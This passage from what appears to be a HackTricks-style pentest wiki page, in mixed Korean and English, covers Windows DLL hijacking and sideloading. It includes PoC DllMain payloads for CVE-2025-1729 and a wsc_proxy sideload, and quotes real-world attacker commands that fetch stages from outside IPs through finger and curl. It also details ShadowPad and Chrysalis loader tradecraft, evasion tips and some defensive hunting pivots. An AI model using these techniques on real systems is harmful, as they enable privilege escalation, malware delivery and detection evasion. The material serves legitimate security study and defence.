Bring Your Own Accessibility (BYOA)
- built-in Accessibility Tool (AT) registry entry(예: CursorIndicator)를 복제하고, 이를 임의의 binary/DLL을 가리키도록 수정한 뒤 import하고, `configuration`을 해당 AT name으로 설정할 수 있다. 이렇게 하면 Accessibility framework 아래에서 임의 execution을 프록시할 수 있다.

Notes
- `%windir%\System32` 아래에 쓰고 HKLM values를 변경하려면 admin rights가 필요하다.
- 모든 payload logic은 `DLL_PROCESS_ATTACH`에 둘 수 있으며, exports는 필요 없다.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

이 사례는 Lenovo의 TrackPoint Quick Menu (`TPQMAssistant.exe`)에서의 **Phantom DLL Hijacking**을 보여주며, **CVE-2025-1729**로 추적된다.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

공격자는 동일한 디렉터리에 악성 `hostfxr.dll` stub을 배치하여, 누락된 DLL을 악용해 사용자의 context에서 code execution을 달성할 수 있다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. standard user로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 drop한다.
2. scheduled task가 9:30 AM에 현재 사용자 컨텍스트에서 실행되기를 기다린다.
3. task가 실행될 때 administrator가 로그인되어 있으면, malicious DLL은 administrator의 session에서 medium integrity로 실행된다.
4. standard UAC bypass techniques를 chain하여 medium integrity에서 SYSTEM privileges로 elevate한다.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors는 신뢰할 수 있는 signed process 아래에서 payload를 실행하기 위해 MSI-based droppers와 DLL side-loading을 자주 함께 사용한다.

Chain overview
- User가 MSI를 다운로드한다. GUI install 중 CustomAction이 조용히 실행되며(예: LaunchApplication 또는 VBScript action), embedded resources에서 다음 stage를 재구성한다.
- dropper는 legitimate, signed EXE와 malicious DLL을 같은 directory에 쓴다(예: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- signed EXE가 시작되면 Windows DLL search order가 working directory에서 먼저 wsc.dll을 load하여, signed parent 아래에서 attacker code를 실행한다 (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- executable 또는 VBScript를 실행하는 항목을 찾아라. 의심스러운 패턴 예시: LaunchApplication이 background에서 embedded file을 실행.
- Orca(Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary tables를 확인한다.
- MSI CAB의 embedded/split payloads:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- 또는 lessmsi를 사용: `lessmsi x package.msi C:\out`
- VBScript CustomAction에 의해 concatenated되고 decrypted되는 여러 개의 작은 fragment를 찾아라. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 다음 두 파일을 같은 폴더에 넣는다:
- wsc_proxy.exe: 합법적으로 서명된 host(Avast). 이 프로세스는 자신의 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도한다.
- wsc.dll: attacker DLL. 특정 exports가 필요하지 않다면 DllMain만으로 충분하다. 그렇지 않다면 proxy DLL을 만들고, DllMain에서 payload를 실행하면서 필요한 exports를 genuine library로 forward한다.
- 최소한의 DLL payload를 빌드한다:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export requirements를 위해 proxying framework(예: DLLirant/Spartacus)를 사용해, payload도 실행하는 forwarding DLL을 생성하세요.

- 이 technique는 host binary의 DLL name resolution에 의존합니다. host가 absolute paths나 safe loading flags(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, 그리고 forwarded exports는 precedence에 영향을 줄 수 있으므로 host binary와 export set을 선택할 때 반드시 고려해야 합니다.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point는 Ink Dragon이 정당한 software처럼 보이면서 core payload를 disk에 encrypted 상태로 유지하기 위해 **three-file triad**를 사용해 ShadowPad를 배포했다고 설명했습니다:

1. **Signed host EXE** – AMD, Realtek, NVIDIA 같은 vendor가 악용됩니다 (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). 공격자는 executable 이름을 Windows binary처럼 보이게 바꾸지만(예: `conhost.exe`), Authenticode signature는 유효한 상태로 유지됩니다.
2. **Malicious loader DLL** – EXE 옆에 예상되는 이름으로 드롭됩니다 (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL은 보통 ScatterBrain framework로 obfuscate된 MFC binary이며, encrypted blob을 찾고 decrypt한 뒤 ShadowPad를 reflectively map하는 역할만 합니다.
3. **Encrypted payload blob** – 보통 같은 디렉터리에 `<name>.tmp`로 저장됩니다. decrypted payload를 memory-mapping한 후 loader는 TMP 파일을 삭제해 forensic evidence를 파괴합니다.

Tradecraft notes:

* Signed EXE를 이름만 바꾸고(PE header의 원래 `OriginalFileName`은 유지) Windows binary처럼 가장하게 하면 vendor signature는 유지되므로, 실제로는 AMD/NVIDIA utility인 `conhost.exe`처럼 보이는 binary를 드롭하는 Ink Dragon의 습관을 그대로 재현하세요.
* executable이 trusted 상태로 유지되므로, 대부분의 allowlisting control은 malicious DLL이 그 옆에만 있으면 됩니다. loader DLL 커스터마이징에 집중하세요; signed parent는 보통 수정 없이 실행할 수 있습니다.
* ShadowPad decryptor는 TMP blob이 loader 옆에 있고 writable 상태여서 mapping 후 파일을 zero 처리할 수 있어야 합니다. payload가 로드될 때까지 directory를 writable로 유지하세요. 메모리에 올라간 뒤에는 TMP 파일을 안전하게 삭제해 OPSEC를 확보할 수 있습니다.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

공격자는 DLL sideloading을 LOLBAS와 결합해, disk에 남는 custom artifact를 trusted EXE 옆의 malicious DLL 하나로 최소화합니다:

- **Remote command loader (Finger):** Hidden PowerShell이 `cmd.exe /c`를 실행하고, Finger server에서 command를 가져와 `cmd`로 파이프합니다:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`는 TCP/79 text를 가져오고; `| cmd`는 server response를 실행해 공격자가 server-side에서 second stage를 교체할 수 있게 합니다.

- **Built-in download/extract:** benign extension이 붙은 archive를 다운로드하고, 압축을 풀어 sideload target과 DLL을 랜덤 `%LocalAppData%` 폴더 아래에 stage합니다:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`은 진행 표시를 숨기고 redirect를 따라갑니다; `tar -xf`는 Windows의 built-in tar를 사용합니다.

- **WMI/CIM launch:** WMI를 통해 EXE를 시작하면 telemetry에 CIM-created process로 보이면서 colocated DLL을 로드합니다:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL을 선호하는 binary와 잘 맞습니다(예: `intelbq.exe`, `nearby_share.exe`); payload(예: Remcos)는 trusted name 아래에서 실행됩니다.

- **Hunting:** `/p`, `/m`, `/c`가 함께 나타나는 `forfiles`를 경고하세요; admin script 외에는 드뭅니다.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom 침투는 trusted update chain을 악용해 NSIS-packed dropper를 전달했고, 여기서 DLL sideload와 fully in-memory payload를 함께 stage했습니다.

Tradecraft flow
- `update.exe` (NSIS)가 `%AppData%\Bluetooth`를 만들고 이를 **HIDDEN**으로 표시한 뒤, 이름이 바뀐 Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, encrypted blob `BluetoothService`를 드롭하고 EXE를 실행합니다.
- host EXE는 `log.dll`을 import하고 `LogInit`/`LogWrite`를 호출합니다. `LogInit`은 blob을 mmap-load하고; `LogWrite`는 custom LCG-based stream(**0x19660D** / **0x3C6EF35F** 상수, 이전 hash에서 파생된 key material)으로 decrypt한 뒤, buffer를 plaintext shellcode로 덮어쓰고 temp를 해제한 다음 그쪽으로 점프합니다.
- IAT를 피하기 위해 loader는 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**으로 export name을 hash한 뒤 Murmur-style avalanche(**0x85EBCA6B**)를 적용하고 salted target hash와 비교해 API를 resolve합니다.

Main shellcode (Chrysalis)
- key `gQ2JR&9;`로 five passes 동안 add/XOR/sub를 반복해 PE-like main module을 decrypt한 뒤, import resolution을 마무리하기 위해 `Kernel32.dll` → `GetProcAddress`를 동적으로 로드합니다.
- character별 bit-rotate/XOR transform을 통해 runtime에서 DLL name string을 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드합니다.
- 두 번째 resolver는 **PEB → InMemoryOrderModuleList**를 따라가며 각 export table을 4-byte block 단위로 Murmur-style mixing으로 파싱하고, hash를 찾지 못했을 때만 `GetProcAddress`로 되돌아갑니다.

Embedded configuration & C2
- Config는 드롭된 `BluetoothService` 파일의 **offset 0x30808**(size **0x980**)에 있으며, key `qwhvb^435h&*7`로 RC4-decrypt되어 C2 URL과 User-Agent를 드러냅니다.
- beacon은 dot-delimited host profile을 만들고, tag `4Q`를 앞에 붙인 뒤, HTTPS를 통한 `HttpSendRequestA` 전에 key `vAuig34%^325hGV`로 RC4-encrypt합니다. response는 RC4-decrypt되어 tag switch(`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)로 분기됩니다.
- execution mode는 CLI args로 제어됩니다: args 없음 = `-i`를 가리키는 persistence(service/Run key) 설치; `-i`는 self를 `-k`로 재실행; `-k`는 install을 건너뛰고 payload를 실행합니다.

Alternate loader observed
- 같은 침투에서 Tiny C Compiler를 드롭하고 `C:\ProgramData\USOShared\`에서 `libtcc.dll`과 함께 `svchost.exe -nostdlib -run conf.c`를 실행했습니다. 공격자가 제공한 C source가 shellcode를 embed, compile, 그리고 PE를 disk에 남기지 않은 채 in-memory로 실행했습니다. 다음과 같이 재현하세요:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 이 TCC 기반 compile-and-run 단계는 런타임에 `Wininet.dll`을 import했고, hardcoded URL에서 second-stage shellcode를 불러와, compiler run처럼 위장하는 유연한 loader를 제공했다.

## export proxying + host thread parking을 이용한 signed-host sideloading

일부 DLL sideloading chain은 **stability engineering**을 추가해, malicious DLL이 load된 뒤에도 legitimate host가 crash하지 않고 이후 stage를 깔끔하게 load할 수 있을 만큼 오래 살아 있게 만든다.

관찰된 패턴
- `version.dll` 같은 예상 dependency 이름을 사용해 trusted EXE를 malicious DLL 옆에 drop한다.
- malicious DLL은 모든 예상 export를 real system DLL로 되돌려 **proxy**한다(예: `%SystemRoot%\\System32\\version.dll`) so import resolution이 계속 성공하고 host process가 정상 동작을 유지한다.
- load 후 malicious DLL은 **host entry point를 patch**해서 main thread가 process를 종료하거나 종료를 유발하는 code path를 실행하는 대신 infinite `Sleep` loop에 빠지게 한다.
- 새 thread가 실제 malicious work를 수행한다: 다음 stage DLL 이름이나 path를 decrypt하고(RC4/XOR가 흔함), `LoadLibrary`로 실행한다.

왜 중요한가
- 일반적인 DLL proxying은 API compatibility를 유지하지만, host가 이후 stage를 위해 충분히 오래 살아 있음을 보장하지는 않는다.
- main thread를 `Sleep(INFINITE)`에 두는 것은 loader가 worker thread에서 decryption, staging, network bootstrap을 수행하는 동안 signed process를 resident 상태로 유지하는 간단한 방법이다.
- 흥미로운 동작이 host entry point가 patch된 뒤와 secondary thread가 시작된 뒤에 일어나면, 수상한 `DllMain`만 hunting해서는 이 패턴을 놓칠 수 있다.

최소 workflow
1. signed host EXE를 복사하고 local directory에서 어떤 DLL을 resolve하는지 확인한다.
2. 동일한 functions를 export하고 legitimate DLL로 forward하는 proxy DLL을 만든다.
3. `DllMain(DLL_PROCESS_ATTACH)`에서 worker thread를 생성한다.
4. 그 thread에서 host entry point나 main thread start routine을 patch해서 `Sleep`을 무한 루프로 돌게 만든다.
5. next-stage DLL name/config를 decrypt하고 `LoadLibrary` 또는 manual-map으로 payload를 실행한다.

방어적 pivot
- signed process가 `System32`가 아니라 자기 application directory에서 `version.dll` 또는 이와 유사하게 흔한 library를 load하는 경우.
- image load 직후 process entry point에 대한 memory patch, 특히 jump/call이 `Sleep`/`SleepEx`로 redirected 된 경우.
- proxy DLL이 만든 thread가 decrypted name을 가진 second DLL에 즉시 `LoadLibrary`를 호출하는 경우.
- `ProgramData`, `%TEMP%`, 또는 unpacked archive path 같은 writable staging directory 안에서 vendor executable 옆에 놓인 full-export proxy DLL.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
